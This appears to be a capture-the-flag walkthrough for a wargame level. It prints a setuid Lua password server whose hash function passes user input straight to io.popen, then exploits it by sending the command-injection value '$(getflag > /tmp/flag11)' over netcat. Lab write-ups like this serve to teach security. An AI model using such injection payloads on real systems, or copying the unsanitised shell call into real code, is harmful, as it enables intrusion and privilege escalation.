We start once again by listing the files in the current directory:
```bash
ls -la
```
Output:
```bash
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

Let's take a look at the level11.lua script:
```bash
cat level11.lua
```
Output:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end
while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

Analyzing the code, we notice that the script creates a server on port 5151 and has a hash function that uses `io.popen()`. This function is vulnerable to **command injection** as it directly concatenates user input with a shell command:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Let's exploit this vulnerability by connecting to the server and injecting a command that will execute `getflag` and redirect its output to a file we can read:

```bash
nc 127.0.0.1 5151
```

When prompted for a password, we inject our command `$(getflag > /tmp/flag11)`

The server will execute:
```bash
echo $(getflag > /tmp/flag11) | sha1sum
```

This will:
1. Execute `getflag` with the privileges of flag11 (due to the setuid bit)
2. Redirect the output to `/tmp/flag11`
3. Echo an empty string to sha1sum

Now let's check the content of our output file:
```bash
cat /tmp/flag11
```

And this way we get our next flag!